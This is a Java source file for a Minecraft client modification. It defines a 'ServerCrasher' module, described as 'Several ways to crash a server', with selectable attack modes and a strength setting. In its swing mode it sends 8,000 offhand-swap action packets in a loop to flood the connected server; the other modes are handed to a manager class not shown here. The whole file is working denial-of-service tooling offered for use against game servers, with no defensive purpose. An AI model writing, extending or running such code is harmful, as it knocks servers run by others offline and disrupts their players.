package me.constantindev.ccl.module;

import me.constantindev.ccl.etc.ServerCrasherManager;
import me.constantindev.ccl.etc.base.Module;
import me.constantindev.ccl.etc.config.ModuleConfig;
import me.constantindev.ccl.etc.config.MultiOption;
import me.constantindev.ccl.etc.helper.ClientHelper;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

import java.util.Random;

public class ServerCrasher extends Module {
    public ServerCrasher() {
        super("ServerCrasher", "Several ways to crash a server");
        this.mconf.add(new MultiOption("mode", "rotation", new String[]{"rotation", "location", "biglocation", "swing"}));
        this.mconf.add(new ModuleConfig.ConfigKey("strength", "100"));
        ServerCrasherManager.runner.start();
    }

    @Override
    public void onExecute() {
        int strength;
        try {
            strength = Integer.parseInt(this.mconf.getByName("strength").value);
            if (strength < 0 || strength > 100) throw new Exception();
        } catch (Exception ignored) {
            ClientHelper.sendChat("Invalid strength for ServerCrasher. Choose one between 0 and 100");
            this.mconf.getByName("strength").setValue("100");
            return;
        }
        ServerCrasherManager.mode = this.mconf.getByName("mode").value;
        ServerCrasherManager.strength = strength;
        if (ServerCrasherManager.mode.equalsIgnoreCase("swing")) {
            if (MinecraftClient.getInstance().getNetworkHandler() == null) {
                this.isEnabled = false;
                return;
            }
            try {
                for (int i = 0; i < 8000; i++) {
                    PlayerActionC2SPacket p = new net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN);
                    MinecraftClient.getInstance().getNetworkHandler().sendPacket(p);
                }
            } catch (Exception ignored) {
                this.isEnabled = false;
            }
        }
        super.onExecute();
    }
}
